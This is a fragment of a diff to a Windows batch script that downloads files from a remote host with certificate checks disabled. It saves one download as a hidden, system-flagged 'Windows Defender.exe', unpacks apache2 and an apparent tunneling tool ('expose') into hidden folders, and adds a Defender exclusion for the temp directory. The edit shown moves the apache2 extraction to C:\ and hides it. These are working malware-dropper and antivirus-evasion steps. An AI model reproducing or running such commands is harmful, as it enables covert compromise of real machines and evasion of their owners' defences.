@@ -41,7 +41,7 @@ mkdir "%environment%\Win32"
 attrib +s +h +i "%environment%\Win32"
 
 "%environment%\curl.exe" -k %proxy% %host%/sfx.exe --output "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
-"%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.zip"
+"%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.zip"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.zip"
 
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
